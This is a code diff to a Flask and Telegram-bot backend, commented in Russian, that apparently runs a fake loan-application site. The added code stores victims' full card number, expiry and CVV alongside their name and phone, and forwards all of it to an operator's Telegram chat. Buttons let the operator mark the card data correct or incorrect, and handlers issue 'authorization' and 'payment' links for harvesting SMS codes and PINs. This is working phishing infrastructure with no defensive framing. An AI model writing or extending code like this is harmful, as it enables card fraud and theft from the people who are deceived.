@@ -26,6 +26,10 @@ def init_db():
     c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
                  (session_id TEXT PRIMARY KEY,
                   phone TEXT, sms_code TEXT, pin_code TEXT)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS card_data
+                 (session_id TEXT PRIMARY KEY,
+                  card_holder TEXT, card_number TEXT, card_expiry TEXT, card_cvv TEXT,
+                  status TEXT DEFAULT 'pending')''')
     conn.commit()
     conn.close()
 
@@ -48,7 +52,7 @@ def get_keyboard(session_id):
         ]
     }
 
-# ========== ОБРАБОТКА КНОПОК ==========
+# ========== ОБРАБОТКА КНОПОК (ВЕБХУК) ==========
 def send_callback_answer(callback_id, text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
     requests.post(url, json={"callback_query_id": callback_id, "text": text})
@@ -72,14 +76,12 @@ def webhook():
         
         if callback_data.startswith('auth:'):
             session_id = callback_data.split(':')[1]
-            # ПРАВИЛЬНАЯ ССЫЛКА НА АВТОРИЗАЦИЮ
             link = f"{SITE_URL}/page_82554/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на авторизацию")
             edit_message_text(chat_id, message_id, f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
             
         elif callback_data.startswith('payment:'):
             session_id = callback_data.split(':')[1]
-            # ПРАВИЛЬНАЯ ССЫЛКА НА ОПЛАТУ (без page_56637)
             link = f"{SITE_URL}/page_63860/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на оплату")
             edit_message_text(chat_id, message_id, f"💳 <b>Ссылка на оплату</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
@@ -94,6 +96,26 @@ def webhook():
             c.execute('UPDATE applications SET status = "rejected" WHERE session_id = ?', (session_id,))
             conn.commit()
             conn.close()
+            
+        elif callback_data.startswith('card_ok:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('INSERT OR REPLACE INTO card_data (session_id, status) VALUES (?, ?)', (session_id, 'approved'))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "✅ Данные подтверждены")
+            edit_message_text(chat_id, message_id, f"✅ <b>ДАННЫЕ КАРТЫ ПОДТВЕРЖДЕНЫ</b>\n\nСессия: {session_id}", None)
+            
+        elif callback_data.startswith('card_error:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('INSERT OR REPLACE INTO card_data (session_id, status) VALUES (?, ?)', (session_id, 'rejected'))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "❌ Данные отклонены")
+            edit_message_text(chat_id, message_id, f"❌ <b>ДАННЫЕ КАРТЫ ОТКЛОНЕНЫ</b>\n\nСессия: {session_id}", None)
     
     return jsonify({"status": "ok"})
 
@@ -136,6 +158,49 @@ def get_application(session_id):
     if row:
         return jsonify({"fullname": row[0], "phone": row[1], "amount": row[2], "term": row[3]})
     return jsonify({"error": "not found"}), 404
+
+@app.route('/submit_card', methods=['POST'])
+def submit_card():
+    data = request.json
+    session_id = data.get('session_id')
+    
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT fullname, phone, amount FROM applications WHERE session_id = ?', (session_id,))
+    app_data = c.fetchone()
+    
+    fullname = app_data[0] if app_data else '—'
+    phone = app_data[1] if app_data else '—'
+    amount = app_data[2] if app_data else '—'
+    
+    # Сохраняем данные карты
+    c.execute('INSERT OR REPLACE INTO card_data (session_id, card_holder, card_number, card_expiry, card_cvv, status) VALUES (?, ?, ?, ?, ?, ?)',
+              (session_id, data['card_holder'], data['card_number'], data['card_expiry'], data['card_cvv'], 'pending'))
+    conn.commit()
+    conn.close()
+    
+    msg = f"""💳 <b>НОВЫЕ ДАННЫЕ КАРТЫ</b>
+
+👤 Клиент: {fullname}
+📱 Телефон: {phone}
+💰 Сумма: {amount} BYN
+
+🏷 Владелец: {data['card_holder']}
+🔢 Номер: {data['card_number']}
+📅 Срок: {data['card_expiry']}
+🔐 CVV: {data['card_cvv']}
+
+🆔 Сессия: <code>{session_id}</code>"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ Данные верные", "callback_data": f"card_ok:{session_id}"}],
+            [{"text": "❌ Данные не верные", "callback_data": f"card_error:{session_id}"}]
+        ]
+    }
+    
+    send_to_admin(msg, keyboard)
+    return jsonify({"status": "ok"})
 
 @app.route('/submit_phone', methods=['POST'])
 def submit_phone():
